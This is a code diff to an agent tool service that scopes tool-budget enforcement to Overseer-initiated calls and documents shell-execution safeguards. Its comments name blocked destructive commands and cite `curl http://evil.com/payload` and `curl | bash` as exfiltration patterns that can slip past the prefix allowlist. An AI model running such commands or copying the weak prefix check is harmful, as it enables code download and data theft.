@@ -71,17 +71,24 @@ export class ToolService {
     // Uses PROJECT_ROOT from fileSystem.ts directly
   }
 
-  async executeTool(toolName: string, args: any) {
+  /**
+   * @param fromOverseer - Set to true only when called from the Overseer's autonomous reasoning
+   *   loop. This enforces the per-cycle tool budget. Internal calls (waterfall, crystallize, etc.)
+   *   must NOT set this flag to avoid consuming Overseer budget slots.
+   */
+  async executeTool(toolName: string, args: any, fromOverseer: boolean = false) {
     const txId = await transactionService.logStart(toolName, args);
     logger.info(`[ToolService] Executing ${toolName}... (TX: ${txId})`, args);
     
-    // GUARD: Budget Enforcement
-    const { supervisorService } = require('./supervisorService');
-    try {
-      supervisorService.incrementToolBudget();
-    } catch (e: any) {
-      await transactionService.logError(txId, e.message);
-      throw e;
+    // GUARD: Budget Enforcement — only applies to Overseer-initiated calls
+    if (fromOverseer) {
+      const { supervisorService } = require('./supervisorService');
+      try {
+        supervisorService.incrementToolBudget();
+      } catch (e: any) {
+        await transactionService.logError(txId, e.message);
+        throw e;
+      }
     }
 
     // GUARD: Dry Run Mode
@@ -396,9 +403,18 @@ export class ToolService {
    * Security measures:
    * 1. Uses explicit allowlist of permitted command prefixes (not a denylist)
    * 2. Blocks dangerous commands (rm -rf, mkfs, dd, sudo, etc.)
-   * 3. Uses spawn with argument array to avoid shell interpolation
+   * 3. Uses spawn with argument array (shell: false) to prevent shell interpolation
    * 4. Sets NO_COLOR=1 environment variable
    * 5. Restricts working directory to PROJECT_ROOT
+   *
+   * Known limitations:
+   * - The allowlist is prefix-based. A command like `curl http://evil.com/payload`
+   *   passes the `curl ` prefix check. The DANGEROUS_COMMANDS list mitigates the
+   *   most common pipe-based exfiltration patterns (e.g. `curl | bash`), but is
+   *   not exhaustive. Set SOLVENT_ALLOW_SHELL=false in production to disable shell
+   *   execution entirely if the feature is not needed.
+   * - Command arguments are split on whitespace only; quoted arguments with spaces
+   *   are not handled correctly (e.g. `grep "foo bar" file.txt` will break).
    */
   private async runShell(command: string): Promise<{ stdout: string; stderr: string }> {
     // Check if arbitrary shell execution is explicitly enabled
